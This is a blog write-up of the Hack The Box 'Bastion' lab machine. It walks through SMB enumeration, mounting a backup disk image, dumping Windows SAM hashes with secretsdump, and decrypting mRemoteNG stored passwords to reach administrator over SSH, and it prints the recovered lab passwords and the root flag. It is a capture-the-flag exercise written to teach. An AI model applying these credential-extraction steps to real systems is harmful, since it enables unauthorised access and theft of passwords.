![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-12.01.15-PM.png)

IP: 10.10.10.134

## Enumeration

As we perform a basic nmap scan: `sudo nmap -sC -sV -O -p- -oA nmap/bastion 10.10.10.134`, we get,

Open ports:

- 22
- 135
- 139
- 445

There were more ports open when a full port scan was done, but it just had msrpc ports open which aren’t so important. Using smbclient to enumerate the drive,

`smclient -L 10.10.10.134`

`kali@starscorp1o:~/htb/boxes/bastion$ smbclient -L 10.10.10.134<br></br>Enter WORKGROUP\kali's password:`

```
    Sharename       Type      Comment                                                                                                                                                                                                  
    ---------       ----      -------                                                                                                                                                                                                  
    ADMIN$          Disk      Remote Admin                                                                                                                                                                                             
    Backups         Disk                                                                                                                                                                                                               
    C$              Disk      Default share                                                                                                                                                                                            
    IPC$            IPC       Remote IPC                                                                                                                                                                                               
```

![](http://vedanttare.com/wp-content/uploads/2022/04/smbclient.png)

Now, reconnecting with SMB1 for workgroup listing.  
`do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br></br>Unable to connect with SMB1 -- no workgroup available`

We could see that there was a share called Backups which was interesting and the others showed access denied. So, I listed the backups share.  
`smbclient //10.10.10.134/Backups`

`kali@starscorp1o:~/htb/boxes/bastion$ smbclient //10.10.10.134/Backups<br></br>Enter WORKGROUP\kali's password:<br></br>Try "help" to get a list of possible commands.<br></br>smb: > ls<br></br>. D 0 Tue Apr 16 06:02:11 2019<br></br>.. D 0 Tue Apr 16 06:02:11 2019<br></br>note.txt AR 116 Tue Apr 16 06:10:09 2019<br></br>SDT65CB.tmp A 0 Fri Feb 22 07:43:08 2019<br></br>WindowsImageBackup D 0 Fri Feb 22 07:44:02 2019`

The note.txt said:-  
**Sysadmins: please don’t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.**

I couldn’t decipher to what this was actually trying to tell me. Though, there was a WindowsImageBackup directory. After digging deep inside it, I couldn’t actually find anything interesting. So, I decided to mount this share on my kali machine so that I can maybe look at hidden files, etc.

`kali@starscorp1o:~/htb/boxes/bastion$ sudo mount -t cifs //10.10.10.134/backups /mnt -o user=,password=<br></br>[sudo] password for kali:<br></br>kali@starscorp1o:~/htb/boxes/bastion$ ls<br></br>BackupGlobalCatalog {cd113385-65ff-4ea2-8ced-5630f6feca8f} GlobalCatalog MediaId nmap nmapfull nmapudp note.txt SDT65CB.tmp<br></br>kali@starscorp1o:~/htb/boxes/bastion$ cd /mnt<br></br>kali@starscorp1o:/mnt$ ls<br></br>note.txt SDT65CB.tmp WindowsImageBackup`

With this I could properly browse through the share and checkout hidden files using `ls -la`.

## Exploitation

I enumerated a lot, but couldn’t find anything properly. Then I saw something interesting. I had found a .vhd file, I googled this extension and it said that it was virtual hard disk which means that it stores all the contents of a hard of a virtual machine. At this point I knew that somewhere I had to find creds so that I could login through SSH. So, I had to somehow get this .vhd file so that I could browse through it for some creds. I googled a bit more and found an article that said that as the .vhd files are too big it’ll take too long to transfer the whole thing. So we had to mount the .vhd file somehow.

Now we had to mount the .vhd file and there was a tool for that called `guestmount`. First we had to install some tools:  
`sudo apt-get install libguestfs-tools<br></br>[sudo] password for kali:<br></br>Reading package lists… Done<br></br>Building dependency tree<br></br>Reading state information… Done`  
The following packages were automatically installed and are no longer required. Then using guestmount:

`kali@starscorp1o:/mnt$ guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/'Backup 2019-02-22 124351'/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v<br></br>libguestfs: creating COW overlay to protect original drive content<br></br>libguestfs: command: run: qemu-img<br></br>libguestfs: command: run: \ create<br></br>libguestfs: command: run: \ -f qcow2<br></br>libguestfs: command: run: \ -o backing_file=/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd<br></br>libguestfs: command: run: \ /tmp/libguestfsNaQKfQ/overlay1.qcow2<br></br>Formatting '/tmp/libguestfsNaQKfQ/overlay1.qcow2', fmt=qcow2 size=15999492096 backing_file=/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd cluster_size=65536 lazy_refcounts=off refcou<br></br>nt_bits=16<br></br>libguestfs: launch: program=guestmount<br></br>libguestfs: launch: version=1.42.0<br></br>libguestfs: launch: backend registered: unix<br></br>libguestfs: launch: backend registered: uml<br></br>libguestfs: launch: backend registered: libvirt`

Mounting the file:

![](http://vedanttare.com/wp-content/uploads/2022/04/mount-share.png)

So, now we had to find credentials for a user. As we knew that this was a windows machine..we could get the encrypted file SAM, SECURITY AND SYSTEM and then dump their hashes and then crack them. So, that’s what we did:

`kali@starscorp1o:/mnt$ sudo cp vhd/Windows/System32/config/SAM .<br></br>kali@starscorp1o:/mnt$ ls<br></br>ls: cannot access 'vhd': Permission denied<br></br>note.txt SAM SDT65CB.tmp vhd WindowsImageBackup<br></br>kali@starscorp1o:/mnt$ sudo cp vhd/Windows/System32/config/SYSTEM .<br></br>kali@starscorp1o:/mnt$ sudo cp vhd/Windows/System32/config/SECURITY .`

Now using secretsdump.py python script we could dump the hashes:

ka`li@starscorp1o:/mnt$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL<br></br>Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation`

`[<em>] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f [</em>] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br></br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></br>L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::<br></br>[<em>] Dumping cached domain logon information (domain/username:hash) [</em>] Dumping LSA Secrets<br></br>[<em>] DefaultPassword (Unknown User):bureaulampje [</em>] DPAPI_SYSTEM<br></br>dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6<br></br>dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd`  
`[*] Cleaning up…`

![](http://vedanttare.com/wp-content/uploads/2022/04/secretsdump.png)

Now we had to crack the hashes, we did that using crackstation and got the password for a user:

![](http://vedanttare.com/wp-content/uploads/2022/04/cracked-hash.png)

`L4mpje:bureaulampje`

Using these creds we were able to successfully login using SSH:

`kali@starscorp1o:~/htb/boxes/bastion$ ssh L4mpje@10.10.10.134<br></br>The authenticity of host '10.10.10.134 (10.10.10.134)' can't be established.<br></br>ECDSA key fingerprint is SHA256:ILc1g9UC/7j/5b+vXeQ7TIaXLFddAbttU86ZeiM/bNY.<br></br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br></br>Warning: Permanently added '10.10.10.134' (ECDSA) to the list of known hosts.<br></br>L4mpje@10.10.10.134's password:<br></br>Permission denied, please try again.<br></br>L4mpje@10.10.10.134's password:<br></br>Microsoft Windows [Version 10.0.14393]<br></br>(c) 2016 Microsoft Corporation. All rights reserved.`

`l4mpje@BASTION C:\Users\L4mpje>id<br></br>'id' is not recognized as an internal or external command,<br></br>operable program or batch file.`

`l4mpje@BASTION C:\Users\L4mpje>whoami<br></br>bastion\l4mpje`

`l4mpje@BASTION C:\Users\L4mpje>dir<br></br>Volume in drive C has no label.<br></br>Volume Serial Number is 0CB3-C487`

`Directory of C:\Users\L4mpje`

`22-02-2019 14:50 .<br></br>22-02-2019 14:50 ..<br></br>22-02-2019 16:26 Contacts<br></br>22-02-2019 16:27 Desktop<br></br>22-02-2019 16:26 Documents<br></br>22-02-2019 16:26 Downloads<br></br>22-02-2019 16:26 Favorites<br></br>22-02-2019 16:26 Links<br></br>22-02-2019 16:26 Music<br></br>22-02-2019 16:26 Pictures<br></br>22-02-2019 16:26 Saved Games<br></br>22-02-2019 16:26 Searches<br></br>22-02-2019 16:26 Videos<br></br>0 File(s) 0 bytes<br></br>13 Dir(s) 11.291.164.672 bytes free`

## Privilege Escalation

I tried almost a handfull of commands but I couldn’t see anything interesting. Then, I found a weird looking program which I hadn’t seen before.

`l4mpje@BASTION C:\Program Files (x86)>dir<br></br>Volume in drive C has no label.<br></br>Volume Serial Number is 0CB3-C487`

`Directory of C:\Program Files (x86)`

`22-02-2019 15:01 .<br></br>22-02-2019 15:01 ..<br></br>16-07-2016 15:23 Common Files<br></br>23-02-2019 10:38 Internet Explorer<br></br>16-07-2016 15:23 Microsoft.NET<br></br>22-02-2019 15:01 mRemoteNG<br></br>23-02-2019 11:22 Windows Defender<br></br>23-02-2019 10:38 Windows Mail<br></br>23-02-2019 11:22 Windows Media Player<br></br>16-07-2016 15:23 Windows Multimedia Platform<br></br>16-07-2016 15:23 Windows NT<br></br>23-02-2019 11:22 Windows Photo Viewer<br></br>16-07-2016 15:23 Windows Portable Devices<br></br>16-07-2016 15:23 WindowsPowerShell<br></br>0 File(s) 0 bytes<br></br>14 Dir(s) 11.208.445.952 bytes free`

I checked the README file and it said the following:  
**mRemoteNG is the next generation of mRemote, a full-featured, multi-tab remote connections manager.**

It allows you to store all your remote connections in a simple yet powerful interface. I googled this and found out that it was a remote connections manager and stores all information about the remote systems also. It stores passwords in a file called confCons.xml. I looked around but couldn’t find it. Then I remebered that every user always has AppData in its home directory(?). I then checked in L4mpje’s home directory and found:

`l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir<br></br>Volume in drive C has no label.<br></br>Volume Serial Number is 0CB3-C487`

`Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG`

`22-02-2019 15:03 .<br></br>22-02-2019 15:03 ..<br></br>22-02-2019 15:03 6.316 confCons.xml<br></br>22-02-2019 15:02 6.194 confCons.xml.20190222-1402277353.backup<br></br>22-02-2019 15:02 6.206 confCons.xml.20190222-1402339071.backup<br></br>22-02-2019 15:02 6.218 confCons.xml.20190222-1402379227.backup<br></br>22-02-2019 15:02 6.231 confCons.xml.20190222-1403070644.backup<br></br>22-02-2019 15:03 6.319 confCons.xml.20190222-1403100488.backup<br></br>22-02-2019 15:03 6.318 confCons.xml.20190222-1403220026.backup<br></br>22-02-2019 15:03 6.315 confCons.xml.20190222-1403261268.backup<br></br>22-02-2019 15:03 6.316 confCons.xml.20190222-1403272831.backup<br></br>22-02-2019 15:03 6.315 confCons.xml.20190222-1403433299.backup<br></br>22-02-2019 15:03 6.316 confCons.xml.20190222-1403486580.backup<br></br>22-02-2019 15:03 51 extApps.xml<br></br>22-02-2019 15:03 5.217 mRemoteNG.log<br></br>22-02-2019 15:03 2.245 pnlLayout.xml<br></br>22-02-2019 15:01 Themes<br></br>14 File(s) 76.577 bytes<br></br>3 Dir(s) 11.317.981.184 bytes free`

I copied that file in Backups folder where the smb server was hosted.

`l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>copy`  
`The syntax of the command is incorrect.`

`l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>copy confCons.xml C:\Backups<br></br>1 file(s) copied.`

Now, I could see L4mpje’s and the administrator’s password in hash format or encrypted format.

![](http://vedanttare.com/wp-content/uploads/2022/04/passwords.png)

So, there was a script which could crack the passwords that the mRemoteNG software stores in whatever format. And, that’s what I did:

`kali@starscorp1o:~/htb/boxes/bastion$ python mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB<br></br>Password: bureaulampje`

![](http://vedanttare.com/wp-content/uploads/2022/04/admin-pass-crack.png)

`kali@starscorp1o:~/htb/boxes/bastion$ python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<br></br>Password: thXLHM96BeKL0ER2`

Using SSH to login as administrator:

`kali@starscorp1o:~/htb/boxes/bastion$ ssh administrator@10.10.10.134<br></br>administrator@10.10.10.134's password:<br></br>Microsoft Windows [Version 10.0.14393]<br></br>(c) 2016 Microsoft Corporation. All rights reserved.`

`administrator@BASTION C:\Users\Administrator>whoami<br></br>bastion\administrator`

![](http://vedanttare.com/wp-content/uploads/2022/04/ssh-admin.png)

And BOOM!!! We got root!!!! Now we could grab the root flag.

administrator@BASTION C:\\Users\\Administrator\\Desktop&gt;type root.txt  
958850b91811676ed6620a9c430e65c8

![](http://vedanttare.com/wp-content/uploads/2022/04/root-flag-got-it.png)

Important links and resources:

<https://github.com/haseebT/mRemoteNG-Decrypt>

mRemote Offline Password Decrypt #

Based on Metasploit Module enum\_mremote\_pwds.rb from David Maloney

Autor: Adriano Marcio Monteiro

E-mail: adrianomarciomonteiro@gmail.com

Blog: adrianomarciomonteiro.blogspot.com.br

\# Usage: ruby mRemoteOffPwdsDecrypt.rb confCons.xml

It was obvious that confCons.xml had passwords.

Check out my previous post:

<figure class="wp-block-embed is-type-wp-embed is-provider-vedant-tare wp-block-embed-vedant-tare"><div class="wp-block-embed__wrapper">> [Hackthebox – Blocky](https://vedanttare.com/hackthebox-blocky/)

<iframe class="wp-embedded-content" data-secret="PNm5iIxFGC" frameborder="0" height="338" marginheight="0" marginwidth="0" sandbox="allow-scripts" scrolling="no" security="restricted" src="https://vedanttare.com/hackthebox-blocky/embed/#?secret=dbgfnihfG8#?secret=PNm5iIxFGC" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" title="“Hackthebox – Blocky” — VEDANT TARE" width="600"></iframe></div></figure>
